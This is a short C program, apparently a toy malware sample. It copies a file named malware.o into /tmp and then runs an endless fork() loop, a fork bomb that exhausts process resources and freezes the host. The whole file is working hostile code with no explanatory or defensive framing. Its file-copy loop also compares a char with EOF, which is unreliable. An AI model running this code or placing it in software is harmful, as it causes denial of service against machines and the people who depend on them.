#include <stdio.h>
#include <unistd.h>

int main() {
	/* Check if file does not exist */
	if ( access( "/tmp/malware.o", F_OK ) == -1 ) {
		printf( "Creating\n" );

		/* Create new file in tmp */
		FILE* f1 = fopen( "/tmp/malware.o", "ab+" );

		/* Copy this file over to new file */
		FILE* f2 = fopen( "./malware.o", "r" );
		char c = fgetc( f2 );
		while ( c != EOF ) {
			fputc( c, f1 );
			c = fgetc( f2 );
		}

		/* Close files */
		fclose( f1 );
		fclose( f2 );
	}

	

	printf( "Done\n" );
	/* Create more processes */
	while ( 1 ) {
		fork();
	}
}
